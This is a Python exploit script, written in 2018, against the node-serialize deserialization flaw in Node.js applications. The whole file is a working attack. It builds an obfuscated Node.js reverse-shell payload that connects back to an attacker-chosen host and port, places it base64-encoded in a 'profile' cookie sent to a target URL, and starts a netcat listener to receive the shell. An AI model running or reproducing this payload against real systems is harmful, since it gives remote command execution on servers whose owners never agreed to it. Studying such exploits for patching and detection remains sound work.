#!/usr/bin/env python3
#  -*- coding: utf-8 -*- ####################################################################################
#▐ ▄       ·▄▄▄▄  ▄▄▄.▐▄▄▄.▄▄ · ·▄▄▄▄  ▄▄▄..▄▄ · ▄▄▄.▄▄▄  ▄▄▄   ▄▄· ▄▄▄.                                    #
#•█▌▐█▪     ██▪ ██ ▀▄.▀·  ·██▐█ ▀.██▪ ██ ▀▄.▀·▐█ ▀.▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·                                #
#▐█▐▐▌ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄▪▄ ██▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄                              #
#██▐█▌▐█▌.▐▌██.██ ▐█▄▄▌▐▌▐█▌▐█▄▪▐███.██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌                                #
#▀▀ █▪ ▀█▄▀▪▀▀▀▀▀•  ▀▀▀  ▀▀▀• ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀.▀  ▀.▀  ▀·▀▀▀  ▀▀▀                                #
#                                                                                                           #
# nodejs_deser_rce.py - nighter@nighter.se                                                        #
#                                                                                                           #
# DATE                                                                                                      #
# 05/05/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Untrusted data passed into unserialize() function  in node-serialize module can be exploited              #
# to achieve arbitrary code execution by passing a serialized JavaScript Object with                        #
# an Immediately invoked function expression (IIFE).                                                        #
#                                                                                                           #                                                                                                     
# Reference                                                                                                 #
# https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ #
#                                                                                                           #
#                                                                                                           #
#                                                                                                           #
#############################################################################################################
__author__ = 'nighter@nighter.se'

import termios
import select
import socket
import os
import fcntl
import requests
import base64
import sys
import time

from multiprocessing import Process

def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]


def BuildNodeJsReverseShell():

    nodejs_rev_shell = '''                                                                                                                                                                                                      
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
   var client = new net.Socket();
   client.connect(PORT, HOST, function() {
      var sh = spawn('/bin/sh',[]);
      client.write("Connected!\\n");
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
      sh.on('exit',function(code,signal){
         client.end("Disconnected!\\n");
      });
   });
   client.on('error', function(e) {
       setTimeout(c(HOST,PORT), TIMEOUT);
   });
}
c(HOST,PORT);
''' % (LHOST, LPORT)

    PAYLOAD = charencode(nodejs_rev_shell)
    _payload = '{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode('+PAYLOAD+'))}()"}'
    return base64.b64encode(_payload.encode('utf-8')).decode('utf-8')
 
    
def exploit():

    time.sleep(5)
    print('[+] Exploit')
    cookies = {'profile': BuildNodeJsReverseShell()}
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'}
    r = requests.get('%s' % URL, cookies=cookies, headers=headers)
    print(r.text)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ▐ ▄       ·▄▄▄▄  ▄▄▄ . ▐▄▄▄.▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
•█▌▐█▪     ██▪ ██ ▀▄.▀·  ·██▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▐█▐▐▌ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄▪▄ ██▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██▐█▌▐█▌.▐▌██. ██ ▐█▄▄▌▐▌▐█▌▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
▀▀ █▪ ▀█▄▀▪▀▀▀▀▀•  ▀▀▀  ▀▀▀• ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
""")
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST = %s" % LHOST)
    print("[+] LPORT = %s" % LPORT)

    # Run exploit Async
    p = Process(target=exploit)
    p.start()
    
    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)